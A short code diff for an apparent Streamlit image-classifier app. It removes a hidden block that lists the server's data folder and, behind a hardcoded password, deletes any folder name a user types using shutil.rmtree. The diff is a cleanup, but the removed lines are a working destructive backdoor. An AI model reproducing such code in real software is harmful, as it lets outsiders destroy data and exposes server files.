@@ -9,11 +9,6 @@ from torch.utils.data import DataLoader, random_split
 import os
 from io import BytesIO
 from PIL import Image
-import hashlib
-import shutil
-
-
-
 
 transform = {
     'train': transforms.Compose([
@@ -165,17 +160,3 @@ st.write("""
     6.This model sometime missclassify or wrong
 """
 )
-
-curr_path = os.getcwd()
-folder_path = os.path.join(curr_path, data_dir)
-st.write(f"folder path: {folder_path}")
-st.write(os.listdir(data_dir))
-passwd = st.text_input("password", type='password')
-if passwd == "hacker4321":
-    if st.button("Delete"):
-        folder = st.text_input("folder name: ")
-        try:
-            shutil.rmtree(folder)
-            st.write("folder deleted")
-        except FileNotFoundError:
-            st.write("Folder Not found!")
